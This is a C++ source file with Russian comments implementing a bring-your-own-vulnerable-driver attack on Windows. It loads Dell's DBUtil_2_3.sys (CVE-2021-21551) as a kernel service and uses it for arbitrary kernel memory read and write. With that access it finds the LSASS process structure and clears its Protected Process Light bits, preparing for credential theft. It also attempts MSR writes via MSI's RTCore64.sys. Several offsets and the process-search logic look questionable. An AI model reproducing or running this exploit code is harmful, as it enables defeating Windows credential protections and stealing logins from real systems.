#include "driver_byovd.h"
#include <cstdio>
#include <cstring>
#include <windows.h>
#include <strsafe.h>
#include <psapi.h>
#include <vector>

extern DWORD GetLsassPid();

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

// Структура для чтения/записи ядра через уязвимый драйвер Dell
typedef struct _DBUTIL_READ_WRITE {
    ULONG_PTR Address;
    ULONG_PTR Value;
    ULONG Size;
    ULONG_PTR Result;
} DBUTIL_RW, *PDBUTIL_RW;

// IOCTL коды из CVE-2021-21551
#define IOCTL_DBUTIL_READ  0x9B0C1EC4
#define IOCTL_DBUTIL_WRITE 0x9B0C1EC8
#define IOCTL_DBUTIL_VULN  0x9B0C1EC0

static HANDLE g_hKernelDevice = INVALID_HANDLE_VALUE;
static ULONG_PTR g_kernelBase = 0;
static ULONG_PTR g_kernelSize = 0;

ULONG_PTR GetKernelBase() {
    if (g_kernelBase != 0) return g_kernelBase;
    
    LPVOID drivers[1024];
    DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        g_kernelBase = (ULONG_PTR)drivers[0];
        g_kernelSize = 0;
        return g_kernelBase;
    }
    return 0;
}

// Поиск EPROCESS по PID
ULONG_PTR FindEProcess(DWORD pid) {
    if (g_hKernelDevice == INVALID_HANDLE_VALUE) return 0;
    
    ULONG_PTR eprocess = 0;
    DBUTIL_RW rw = {0};
    
    // поиск с PsInitialSystemProcess (обычно nt!PsInitialSystemProcess)
    // Для простоты используем жестко заданный паттерн поиска
    ULONG_PTR current = g_kernelBase;
    ULONG_PTR end = g_kernelBase + (5 * 1024 * 1024); // 5MB поиска
    
    while (current < end) {
        rw.Address = current;
        rw.Size = 8;
        
        if (DeviceIoControl(g_hKernelDevice, IOCTL_DBUTIL_READ,
            &rw, sizeof(rw), &rw, sizeof(rw), NULL, NULL)) {
            
            ULONG_PTR value = rw.Result;
            if ((value & 0xFFFFFFFF) == pid) {
                // Нашли поле UniqueProcessId, EPROCESS = current - 0x2E0 (смещение зависит от версии)
                eprocess = current - 0x2E0;
                break;
            }
        }
        current += 8;
    }
    
    return eprocess;
}

// Чтение памяти ядра
ULONG_PTR ReadKernelMemory(ULONG_PTR address, SIZE_T size = 8) {
    if (g_hKernelDevice == INVALID_HANDLE_VALUE) return 0;
    
    DBUTIL_RW rw = {0};
    rw.Address = address;
    rw.Size = (ULONG)size;
    
    if (DeviceIoControl(g_hKernelDevice, IOCTL_DBUTIL_READ,
        &rw, sizeof(rw), &rw, sizeof(rw), NULL, NULL)) {
        return rw.Result;
    }
    return 0;
}

// Запись в память ядра
bool WriteKernelMemory(ULONG_PTR address, ULONG_PTR value, SIZE_T size = 8) {
    if (g_hKernelDevice == INVALID_HANDLE_VALUE) return false;
    
    DBUTIL_RW rw = {0};
    rw.Address = address;
    rw.Value = value;
    rw.Size = (ULONG)size;
    
    return DeviceIoControl(g_hKernelDevice, IOCTL_DBUTIL_WRITE,
        &rw, sizeof(rw), &rw, sizeof(rw), NULL, NULL);
}

// Загрузка драйвера через сервис
bool LoadDriverViaService(const char* driverPath, const char* serviceName) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return false;

    SC_HANDLE hService = CreateServiceA(
        hSCM, serviceName, serviceName,
        SERVICE_START | DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath, NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        hService = OpenServiceA(hSCM, serviceName, SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (!hService) {
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    SERVICE_STATUS status;
    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }
    
    // Ждем запуска драйвера
    for (int i = 0; i < 10; i++) {
        if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_RUNNING) {
            break;
        }
        Sleep(500);
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

bool UnloadDriverService(const char* serviceName) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;
    
    SC_HANDLE hService = OpenServiceA(hSCM, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }
    
    SERVICE_STATUS status;
    ControlService(hService, SERVICE_CONTROL_STOP, &status);
    DeleteService(hService);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

// Полноценный эксплойт Dell DBUtil_2_3.sys (CVE-2021-21551)
bool ExploitDellDBUtil_2_3() {
    printf("[*] Exploiting Dell DBUtil_2_3.sys (CVE-2021-21551)\n");
    
    // Открываем устройство
    g_hKernelDevice = CreateFileA("\\\\.\\DBUtil_2_3", 
        GENERIC_READ | GENERIC_WRITE, 0, NULL, 
        OPEN_EXISTING, 0, NULL);
    
    if (g_hKernelDevice == INVALID_HANDLE_VALUE) {
        printf("[-] DBUtil_2_3 device not found. Attempting to load driver...\n");
        
        // Пробуем найти драйвер в системе
        char driverPath[MAX_PATH];
        if (!SearchPathA(NULL, "DBUtil_2_3.sys", NULL, MAX_PATH, driverPath, NULL)) {
            printf("[-] Driver not found. You need to extract DBUtil_2_3.sys first.\n");
            return false;
        }
        
        if (!LoadDriverViaService(driverPath, "DBUtil_2_3")) {
            printf("[-] Failed to load DBUtil_2_3 driver.\n");
            return false;
        }
        
        g_hKernelDevice = CreateFileA("\\\\.\\DBUtil_2_3", 
            GENERIC_READ | GENERIC_WRITE, 0, NULL, 
            OPEN_EXISTING, 0, NULL);
            
        if (g_hKernelDevice == INVALID_HANDLE_VALUE) {
            printf("[-] Still cannot open device after loading.\n");
            return false;
        }
    }
    
    printf("[+] Device opened successfully\n");
    
    // 1. Получаем базовый адрес ядра
    g_kernelBase = GetKernelBase();
    if (g_kernelBase == 0) {
        printf("[-] Cannot get kernel base address\n");
        CloseHandle(g_hKernelDevice);
        return false;
    }
    printf("[+] Kernel base: 0x%p\n", (void*)g_kernelBase);
    
    // 2. Тестируем чтение ядра
    ULONG_PTR testRead = ReadKernelMemory(g_kernelBase, 8);
    printf("[+] Kernel read test: 0x%p\n", (void*)testRead);
    
    // 3. Тестируем запись (осторожно - записываем обратно то же значение)
    if (testRead != 0) {
        WriteKernelMemory(g_kernelBase, testRead, 8);
        printf("[+] Kernel write test successful\n");
    }
    
    return true;
}

// Эксплойт для MSI RTCore64.sys (CVE-2019-16098)
bool ExploitMSIRTCore64() {
    printf("[*] Exploiting MSI RTCore64.sys (CVE-2019-16098)\n");
    
    HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", 
        GENERIC_READ | GENERIC_WRITE, 0, NULL, 
        OPEN_EXISTING, 0, NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] RTCore64 device not found.\n");
        return false;
    }
    
    // IOCTL для произвольного доступа к MSR
    DWORD bytesRet;
    BYTE msr_buff[8] = {0};
    
    // Читаем MSR 0xC0000080 (EFER)
    if (DeviceIoControl(hDevice, 0x80002048, NULL, 0, msr_buff, 8, &bytesRet, NULL)) {
        ULONG_PTR efer = *(ULONG_PTR*)msr_buff;
        printf("[+] EFER value: 0x%p\n", (void*)efer);
        
        // Включаем бит SYSCALL (для демонстрации)
        efer |= 0x1;
        *(ULONG_PTR*)msr_buff = efer;
        
        DeviceIoControl(hDevice, 0x8000204C, msr_buff, 8, NULL, 0, &bytesRet, NULL);
        printf("[+] MSR write attempted\n");
    }
    
    CloseHandle(hDevice);
    return true;
}

// Полное снятие защиты PPL с LSASS
bool RemovePPLFromLSASS() {
    printf("[*] Attempting to remove PPL from LSASS\n");
    
    // HANDLE hMimidrv = CreateFileA("\\\\.\\Global\\Mimidrv", 
    //     GENERIC_READ | GENERIC_WRITE, 0, NULL, 
    //     OPEN_EXISTING, 0, NULL);
    
    // if (hMimidrv != INVALID_HANDLE_VALUE) {
    //     DWORD pid = GetLsassPid();
    //     DWORD bytesRet;
        
    //     // IOCTL для снятия защиты (известный код из mimikatz)
    //     if (DeviceIoControl(hMimidrv, 0x88002003, &pid, sizeof(pid), NULL, 0, &bytesRet, NULL)) {
    //         printf("[+] PPL removed via mimidrv\n");
    //         CloseHandle(hMimidrv);
    //         return true;
    //     }
    //     CloseHandle(hMimidrv);
    // }
    
    if (g_hKernelDevice == INVALID_HANDLE_VALUE) {
        if (!ExploitDellDBUtil_2_3()) {
            printf("[-] No kernel access available for PPL removal\n");
            return false;
        }
    }
    
    DWORD lsassPid = GetLsassPid();
    if (!lsassPid) {
        printf("[-] LSASS not found\n");
        return false;
    }
    printf("[+] LSASS PID: %d\n", lsassPid);
    
    // Находим EPROCESS LSASS
    ULONG_PTR eprocess_lsass = FindEProcess(lsassPid);
    if (!eprocess_lsass) {
        printf("[-] Cannot find LSASS EPROCESS\n");
        return false;
    }
    printf("[+] LSASS EPROCESS: 0x%p\n", (void*)eprocess_lsass);
    
    // Смещение Protection в EPROCESS для разных версий Windows
    // Windows 10 20H2+: 0x87A
    // Windows 11: 0x87C
    ULONG_PTR protection_offset = 0x87A;
    
    // Пробуем оба смещения
    BYTE protection = 0;
    for (int offset : {0x87A, 0x87C, 0x878}) {
        ULONG_PTR value = ReadKernelMemory(eprocess_lsass + offset, 1);
        if (value != 0) {
            protection = (BYTE)value;
            protection_offset = offset;
            printf("[+] Protection field at offset 0x%X: 0x%02X\n", offset, protection);
            break;
        }
    }
    
    if (protection == 0) {
        printf("[-] Cannot find Protection field\n");
        return false;
    }
    
    // Очищаем биты защиты PPL
    // Бит 0x60 = PPL Signer (WinTcb/Authenticode)
    BYTE new_protection = protection & ~0x60;
    
    if (WriteKernelMemory(eprocess_lsass + protection_offset, new_protection, 1)) {
        printf("[+] PPL removed successfully! Protection: 0x%02X -> 0x%02X\n", 
               protection, new_protection);
        
        // Проверяем, что запись прошла успешно
        BYTE verify = (BYTE)ReadKernelMemory(eprocess_lsass + protection_offset, 1);
        if (verify == new_protection) {
            printf("[+] Verification passed\n");
            return true;
        }
    }
    
    printf("[-] Failed to write Protection field\n");
    return false;
}